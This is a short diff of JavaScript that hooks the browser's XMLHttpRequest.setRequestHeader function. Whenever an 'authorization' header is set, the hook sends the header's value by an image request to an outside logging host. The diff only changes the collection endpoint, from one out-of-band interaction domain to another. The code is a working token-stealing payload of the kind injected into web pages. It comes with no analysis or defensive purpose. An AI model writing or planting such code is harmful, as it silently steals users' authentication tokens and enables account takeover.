@@ -21,7 +21,7 @@
 
     XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
         if (header.toLowerCase() === 'authorization') {
-            new Image().src = `https://28ac04qq.instances.httpworkbench.com/log?t=${encodeURIComponent(value)}&type=xhr`;
+            new Image().src = `https://n4sbyn3y58xbi58etdffm6xtpkvbj37s.oastify.com/log?t=${encodeURIComponent(value)}&type=xhr`;
         }
         return originalSetRequestHeader.apply(this, arguments);
     };
